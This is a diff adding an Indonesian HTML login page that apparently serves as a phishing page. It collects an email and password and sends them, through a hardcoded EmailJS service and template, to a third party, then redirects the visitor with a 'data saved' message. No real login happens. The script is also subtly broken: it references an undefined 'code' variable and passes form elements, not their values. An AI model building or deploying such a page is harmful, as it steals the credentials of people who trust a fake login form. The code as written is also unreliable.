@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login | Pengumpulan Data</title>
+  
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Poppins", sans-serif;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      background: linear-gradient(135deg, #90caf9 50%, #e3f2fd 50%);
+    }
+
+    .container {
+      background: #ffffff;
+      width: 420px;
+      margin-right: 80px;
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      text-align: center;
+      animation: fadeIn 0.7s ease;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #1976d2;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input {
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    input:focus {
+      border-color: #64b5f6;
+      box-shadow: 0 0 5px rgba(100, 181, 246, 0.6);
+    }
+
+    button {
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background-color: #1976d2;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #0d47a1;
+    }
+
+    .loading {
+      display: none;
+      color: #1976d2;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .policy {
+      margin-top: 20px;
+      font-size: 13px;
+    }
+
+    .policy a {
+      color: #1976d2;
+      text-decoration: none;
+    }
+
+    .policy a:hover {
+      text-decoration: underline;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Login</h1>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Masukkan Email" required>
+      <input type="password" id="password" placeholder="Masukkan Password" required>
+      <button type="submit">Masuk</button>
+      <div class="loading" id="loading">Mencoba masuk.....</div>
+    </form>
+    <div class="policy">
+      <a href="privacy.html">Privacy & Policy</a>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+    emailjs.init("4ouxaUkNkXNV7IwFa"); // Ganti dengan Public Key kamu
+  })();
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const loading = document.getElementById("loading");
+    loading.style.display = "block";
+
+    const templateParams = {
+      user_email: email,
+      user_password: password,
+      verification_code: code
+    };
+
+    emailjs.send("service_gbaqlrq", "template_gnsct6i", templateParams)
+      .then(() => {
+        loading.innerText = "Penyimpanan data berhasil";
+        setTimeout(() => {
+          window.location.href = "selesai.html";
+        }, 1500);
+      })
+      .catch(() => {
+        loading.innerText = "Gagal, tolong coba lagi";
+      });
+  });
+  </script>
+</body>
+</html>
